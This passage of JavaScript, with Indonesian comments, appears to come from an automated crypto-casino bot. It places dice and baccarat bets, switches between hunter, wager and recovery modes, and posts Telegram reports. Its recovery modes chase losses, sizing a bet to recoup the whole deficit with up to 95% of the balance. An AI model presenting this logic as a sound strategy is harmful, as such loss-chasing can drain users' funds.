    async function runBaccaratLoop() {
        if (!bot.baccarat.active) return;
        
        // Cek profit keseluruhan sudah ≥ 0?
        if (bot.stats.profit >= 0) {
            updateUILog(`✅ BACCARAT RECOVERY SUCCESS! Profit: ${bot.stats.profit.toFixed(8)} → Switching to WAGER MODE`);
            bot.baccarat.active = false;
            bot.isWagerMode = true;
            bot.wagerBetCounter = 0;
            return;
        }
        
        // Cek emergency trigger (100 bet tanpa profit ≥ 0)
        if (bot.baccarat.betCount >= bot.baccarat.maxBetsBeforeEmergency && bot.stats.profit < 0) {
            updateUILog(`⚠️ BACCARAT: ${bot.baccarat.betCount} bets without profit ≥ 0 → Switching to EMERGENCY RECOVERY`);
            bot.baccarat.active = false;
            bot.emergency.active = true;
            bot.emergency.lossAmount = bot.baccarat.lossSinceStart;
            bot.emergency.currentAttempts = 0;
            bot.emergency.triggeredFrom = "baccarat";
            return;
        }
        
        // Dapatkan side berdasarkan reverse trend
        const side = getReverseTrendSide();
        bot.baccarat.side = side;
        
        // Hitung bet dengan PRB
        const betAmount = calculateBaccaratBet();
        
        if (betAmount > bot.stats.currentBal) {
            updateUILog(`❌ BACCARAT: Insufficient balance! Stopping bot.`);
            bot.isRunning = false;
            toggleStartStop(false);
            return;
        }
        
        updateUILog(`🃏 BACCARAT #${bot.baccarat.betCount+1} | Side: ${side.toUpperCase()} | Bet: ${betAmount.toFixed(8)} | Step: ${bot.baccarat.consecutiveLosses} | Loss: ${bot.baccarat.lossSinceStart.toFixed(8)}`);
        
        const result = await placeBaccaratBet(side, betAmount);
        
        if (result) {
            const { isWin, isTie, pnl, result: gameResult } = processBaccaratResult(result, side, betAmount);
            
            const resultIcon = isWin ? "✅ WIN" : (isTie ? "🤝 TIE" : "❌ LOSS");
            updateUILog(`🃏 Result: ${resultIcon} | ${side} vs ${gameResult} | PnL: ${pnl >= 0 ? '+' : ''}${pnl.toFixed(8)} | Balance: ${bot.stats.currentBal.toFixed(8)}`);
            
            bot.betTimestamps.push(Date.now());
            if (bot.betTimestamps.length > 100) bot.betTimestamps.shift();
        } else {
            updateUILog(`❌ Baccarat bet failed!`);
        }
        
        if (bot.baccarat.active) {
            setTimeout(runBaccaratLoop, bot.delay);
        }
    }
    
    // ==================== EMERGENCY RECOVERY ====================
    function calculateEmergencyBet(lossAmount, chance) {
        const payout = 99 / chance;
        const betAmount = Math.abs(lossAmount) / (payout - 1);
        return betAmount;
    }
    
    async function executeEmergencyBet() {
        if (!bot.emergency.active) return;
        
        // Pilih chance random antara min dan max
        const chanceRange = bot.emergency.maxChance - bot.emergency.minChance;
        const chance = bot.emergency.minChance + (Math.random() * chanceRange);
        const finalChance = Math.min(99, Math.max(1, parseFloat(chance.toFixed(1))));
        
        const betAmount = calculateEmergencyBet(bot.emergency.lossAmount, finalChance);
        const finalBet = Math.min(betAmount, bot.stats.currentBal * 0.95);
        
        if (finalBet > bot.stats.currentBal) {
            updateUILog(`❌ EMERGENCY: Insufficient balance! Stopping bot.`);
            bot.isRunning = false;
            bot.emergency.active = false;
            toggleStartStop(false);
            return;
        }
        
        updateUILog(`🚨 EMERGENCY #${bot.emergency.currentAttempts + 1}/${bot.emergency.maxAttempts} | Chance: ${finalChance.toFixed(1)}% | Bet: ${finalBet.toFixed(8)} | Target Loss: ${bot.emergency.lossAmount.toFixed(8)}`);
        
        // Place bet menggunakan Dice dengan chance yang dipilih
        const result = await placeBet(finalBet, finalChance);
        
        if (result && result.diceRoll) {
            const d = result.diceRoll;
            let win = false;
            let payoutMultiplier = parseFloat(d.payoutMultiplier) || 0;
            let payout = parseFloat(d.payout) || 0;
            
            if (d.win !== undefined) {
                win = d.win;
            } else if (payoutMultiplier > 1) {
                win = true;
                if (payout === 0) payout = finalBet * payoutMultiplier;
            } else if (payoutMultiplier === 0 && payout === 0) {
                win = false;
            } else {
                const state = d.state;
                if (state && state.result !== undefined && state.target !== undefined) {
                    win = state.condition === "above" ? state.result > state.target : state.result < state.target;
                } else {
                    win = false;
                }
            }
            
            const pnl = win ? (payout - finalBet) : -finalBet;
            
            bot.stats.bets++;
            bot.stats.wagered += finalBet;
            bot.stats.currentBal += pnl;
            bot.stats.profit += pnl;
            
            if (win) {
                bot.stats.wins++;
                updateUILog(`🚨 EMERGENCY: ✅ WIN! PnL: +${pnl.toFixed(8)} | Balance: ${bot.stats.currentBal.toFixed(8)}`);
                
                // Success! Lanjut ke Wager Mode
                bot.emergency.active = false;
                bot.isWagerMode = true;
                bot.wagerBetCounter = 0;
                updateUILog(`✅ EMERGENCY SUCCESS! Switching to WAGER MODE`);
                return;
            } else {
                bot.stats.loss++;
                bot.emergency.currentAttempts++;
                updateUILog(`🚨 EMERGENCY: ❌ LOSS! PnL: ${pnl.toFixed(8)} | Attempts left: ${bot.emergency.maxAttempts - bot.emergency.currentAttempts}`);
                
                // Update loss amount (loss makin besar)
                bot.emergency.lossAmount = Math.abs(bot.stats.profit);
                
                // Cek max attempts
                if (bot.emergency.currentAttempts >= bot.emergency.maxAttempts) {
                    updateUILog(`❌ EMERGENCY FAILED! Max attempts reached. Stopping bot.`);
                    bot.isRunning = false;
                    bot.emergency.active = false;
                    toggleStartStop(false);
                    await sendTelegramReport(`\`\`\`🚨 EMERGENCY RECOVERY FAILED\nLoss: ${bot.stats.profit.toFixed(8)}\nBalance: ${bot.stats.currentBal.toFixed(8)}\`\`\``);
                    return;
                }
            }
        } else {
            updateUILog(`❌ Emergency bet failed!`);
            bot.emergency.currentAttempts++;
        }
        
        if (bot.emergency.active) {
            setTimeout(executeEmergencyBet, bot.delay);
        }
    }

    // ==================== LOGIKA BOT (HUNTER DICE) ====================
    function setNewBaseChance() {
        bot.baseChance = parseFloat((Math.random() * (bot.chanceMax - bot.chanceMin) + bot.chanceMin).toFixed(1));
        bot.currentChance = bot.baseChance;
        bot.singleChanceBets = 0;
        bot.singleChanceLimit = Math.round(99 / bot.baseChance);
        bot.tg = bot.perStep;
    }
    
    function resetProfitStats() {
        const savedWagered = bot.stats.wagered;
        
        bot.stats.startBal = bot.stats.currentBal;
        bot.stats.profit = 0;
        bot.stats.bets = 0;
        bot.stats.wins = 0;
        bot.stats.loss = 0;
        bot.stats.maxDD = 0;
        bot.stats.maxBet = 0;
        bot.stats.wagered = savedWagered;
        
        bot.targetAbs = bot.stats.startBal * (bot.targetPercent / 100);
        bot.perStep = bot.targetAbs / bot.stepsLimit;
        bot.wagerBetCounter = 0;
        bot.isWagerMode = false;
        
        updateBaseBet();
        setNewBaseChance();
        
        updateUILog("WAGER DONE! Profit reset. Back to HUNTER.");
    }
    
    function checkWagerMode() {
        if (bot.stats.startBal <= 0) return;
        
        const profitPct = (bot.stats.profit / bot.stats.startBal) * 100;
        
        if (!bot.isWagerMode && profitPct >= bot.profitTargetPct) {
            bot.isWagerMode = true;
            bot.wagerBetCounter = 0;
            updateUILog("WAGER MODE ACTIVATED! (50 bets)");
        }
    }
    
    function checkMaxBetTrigger() {
        // Cek apakah bet size mencapai maxBetMultiplier (trigger pindah ke Baccarat)
        const maxBet = bot.baseBet * bot.maxBetMultiplier;
        const nextBet = calculateHunterBet();
        
        if (nextBet >= maxBet && !bot.baccarat.active && !bot.emergency.active && !bot.isWagerMode && bot.baccarat.enabled) {
            updateUILog(`⚠️ MAX BET TRIGGERED! Bet: ${nextBet.toFixed(8)} >= Max: ${maxBet.toFixed(8)} → Switching to BACCARAT`);
            switchToBaccaratMode();
            return true;
        }
        return false;
    }
    
    function calculateHunterBet() {
        if (bot.isWagerMode) {
            return bot.stats.currentBal / bot.wagerDV;
        }
        
        const payout = 99 / bot.currentChance;
        let nextBet = (Math.abs(bot.tg) / (payout - 1)) * bot.margin;
        if (bot.tg === bot.perStep) nextBet = bot.baseBet;
        
        if (nextBet < bot.minBet) nextBet = bot.minBet;
        
        const maxBet = bot.baseBet * bot.maxBetMultiplier;
        if (nextBet > maxBet && !bot.baccarat.enabled) {
            nextBet = bot.baseBet;
            bot.tg = bot.perStep;
        }
        
        return nextBet;
    }

    async function runLoop() {
        if (!bot.isRunning || bot.isSleeping) return;
        
        // PRIORITAS 1: Emergency Recovery
        if (bot.emergency.active) {
            await executeEmergencyBet();
            return;
        }
        
        // PRIORITAS 2: Baccarat Mode
        if (bot.baccarat.active) {
            await runBaccaratLoop();
            return;
        }
        
        const now = Date.now();
        
        await updateFiatRates();
        
        if (now - bot.lastTGReport >= TG_CONFIG.reportInterval && bot.stats.bets > 0) {
            bot.lastTGReport = now;
            await sendSessionReport();
        }
        
        try {
            let nextBet, chanceToUse;
            const currentBalance = bot.stats.currentBal;
            
            if (currentBalance <= 0) {
                updateUILog("Balance is zero! Stopping bot.");
                bot.isRunning = false;
                toggleStartStop(false);
                return;
            }
            
            // Cek trigger maxBet untuk pindah ke Baccarat
            if (checkMaxBetTrigger()) {
                return;
            }
            
            if (bot.isWagerMode) {
                nextBet = currentBalance / bot.wagerDV;
                chanceToUse = bot.wagerChance;
            } else {
                if (bot.singleChanceBets < bot.singleChanceLimit) {
                    bot.currentChance = bot.baseChance;
                } else {
                    bot.currentChance = Math.floor(Math.random() * 11) + (bot.baseChance + 5);
                }
                chanceToUse = Math.min(95, Math.max(1, bot.currentChance));
                
                const payout = 99 / chanceToUse;
                nextBet = (Math.abs(bot.tg) / (payout - 1)) * bot.margin;
                if (bot.tg === bot.perStep) nextBet = bot.baseBet;
                
                if (nextBet < bot.minBet) nextBet = bot.minBet;
                
                const maxBet = bot.baseBet * bot.maxBetMultiplier;
                if (nextBet > maxBet && !bot.baccarat.enabled) {
                    nextBet = bot.baseBet;
                    bot.tg = bot.perStep;
                }
            }
            
            if (nextBet > currentBalance && currentBalance > 0) nextBet = currentBalance;
            if (nextBet < 0.00000001) nextBet = 0.00000001;
            if (nextBet > bot.stats.maxBet) bot.stats.maxBet = nextBet;

            const result = await placeBet(nextBet, chanceToUse);
            
            if (result && result.diceRoll) {
                const d = result.diceRoll;
                
                let win;
                let winAmount = parseFloat(d.amount) || 0;
                let payoutMultiplier = parseFloat(d.payoutMultiplier) || 0;
                let payout = parseFloat(d.payout) || 0;
                
                if (d.win !== undefined) {
                    win = d.win;
                } else if (payoutMultiplier > 1) {
                    win = true;
                    if (payout === 0) payout = winAmount * payoutMultiplier;
                } else if (payoutMultiplier === 0 && payout === 0) {
                    win = false;
                } else {
                    const state = d.state;
                    if (state && state.result !== undefined && state.target !== undefined) {
                        win = state.condition === "above" ? state.result > state.target : state.result < state.target;
                    } else {
                        win = false;
                    }
                }
                
                const pft = win ? (payout - winAmount) : -winAmount;
                
                bot.stats.bets++; 
                bot.stats.wagered += winAmount;
                bot.stats.profit += pft; 
                bot.stats.currentBal += pft;
                
                bot.betTimestamps.push(Date.now());
                if (bot.betTimestamps.length > 100) bot.betTimestamps.shift();
                
                if (bot.stats.currentBal < bot.stats.startBal) {
                    let dd = bot.stats.startBal - bot.stats.currentBal;
                    if (dd > bot.stats.maxDD) bot.stats.maxDD = dd;
                }

                const modeTag = bot.isWagerMode ? "[W]" : "";
                updateLogs(winAmount, chanceToUse, pft, modeTag, win);

                if (win) { 
                    bot.stats.wins++;
                    if (!bot.isWagerMode) setNewBaseChance();
                } else { 
                    bot.stats.loss++;
                    if (!bot.isWagerMode) {
                        bot.singleChanceBets++; 
                        bot.tg += (winAmount + bot.perStep);
                    }
                }
                
                if (bot.isWagerMode) {
                    bot.wagerBetCounter++;
                    if (bot.wagerBetCounter >= bot.wagerBetCount) {
                        resetProfitStats();
                    }
                } else {
                    checkWagerMode();
                }

                const stopLossAbs = bot.stats.startBal * (bot.stopLossPercent / 100);
                
                if (bot.stats.profit >= bot.targetAbs) { 
                    bot.isRunning = false; 
                    updateUILog("TARGET PROFIT REACHED! Bot Stopped.");
                    toggleStartStop(false);
                    await sendTelegramReport(`\`\`\`TARGET PROFIT REACHED\nProfit: ${bot.stats.profit.toFixed(8)}\`\`\``);
                    return;
                }
                
                if (bot.stats.profit <= -stopLossAbs) {
                    bot.isRunning = false;
                    updateUILog("STOP LOSS REACHED! Bot Stopped.");
                    toggleStartStop(false);
                    const profitPct = (bot.stats.profit / bot.stats.startBal) * 100;
                    await sendTelegramReport(`\`\`\`STOP LOSS REACHED\nLoss: ${profitPct.toFixed(2)}%\`\`\``);
                    return;
                }
                
                if (!bot.isWagerMode && bot.stats.bets >= bot.stepsLimit) {
                    updateUILog("STEPS LIMIT REACHED! Sleeping 5s...");
                    bot.isSleeping = true;
                    
                    setTimeout(() => {
                        bot.stats.bets = 0;
                        bot.stats.wins = 0;
                        bot.stats.loss = 0;
                        bot.betTimestamps = [];
                        bot.isSleeping = false;
                        bot.isRunning = true;
                        updateUILog("Steps reset! Continuing...");
                        runLoop();
                    }, 5000);
                    return;
                }
            }
            
            if (bot.isRunning && !bot.isSleeping) {
                setTimeout(runLoop, bot.delay);
            }
        } catch (e) {
            updateUILog(`Error: ${e.message}`);
            setTimeout(runLoop, 1000);
        }
    }

